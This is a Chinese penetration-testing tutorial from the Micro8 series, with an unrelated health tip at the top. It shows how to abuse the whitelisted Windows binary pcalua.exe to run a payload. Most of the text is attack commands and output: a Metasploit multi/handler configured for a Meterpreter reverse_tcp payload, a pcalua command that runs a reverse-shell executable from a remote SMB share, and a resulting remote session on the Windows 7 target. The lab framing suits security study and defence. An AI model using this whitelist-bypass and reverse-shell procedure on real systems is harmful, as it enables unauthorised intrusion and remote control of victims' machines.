---
title: 85、基于白名单Pcalua执行payload第十五季
date: 2019-09-21 19:06:44
comments: true
categories: 
 - Micro8系列
---


**注：**请多喝点热水或者凉白开，可预防**肾结石，通风**等。
痛风可伴发肥胖症、高血压病、糖尿病、脂代谢紊乱等多种代谢性疾病。

### Pcalua简介：

Windows进程兼容性助理(Program Compatibility Assistant)的一个组件。

**说明：**Pcalua.exe所在路径已被系统添加PATH环境变量中，因此，Pcalua命令可识别

Windows 7 默认位置：  
```code
C:\Windows\System32\pcalua.exe
```

**攻击机：** 192.168.1.4 Debian  
**靶机：** 192.168.1.5 Windows 7  

### 配置攻击机msf：
```code
msf exploit(multi/handler) > show options 

Module options (exploit/multi/handler): 

Name Current Setting Required Description
‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐ 

Payload options (windows/meterpreter/reverse_tcp): 

Name Current Setting Required Description
‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐
EXITFUNC process yes Exit technique (Accepted: '', seh, thread, process, none)

LHOST 192.168.1.4 yes The listen address (an interface may be specified)

LPORT 53 yes The listen port

Exploit target: 

Id Name
‐‐ ‐‐‐‐
0 Wildcard Target 

msf exploit(multi/handler) > exploit 

[*] Started reverse TCP handler on 192.168.1.4:53 
```
![](../do/media/13ed50e69746598b03e25538d5ce8f0e.jpg)


### 靶机执行：

```code
Pcalua -m -a \\192.168.1.119\share\rev_x86_53_exe.exe
```
![](../do/media/812c8fdac52fcd263438540c02c72205.jpg)

```code
msf exploit(multi/handler) > exploit 

[*] Started reverse TCP handler on 192.168.1.4:53
[*] Sending stage (179779 bytes) to 192.168.1.5
[*] Meterpreter session 23 opened (192.168.1.4:53 ‐> 192.168.1.5:11349)
at 2019‐01‐20 09:25:01 ‐0500
meterpreter > getuid
Server username: John‐PC\John
meterpreter > getpid
Current pid: 11236
meterpreter > 
```

![](../do/media/245a3a34008b549f40544d7438828123.jpg)

>   Micropoor
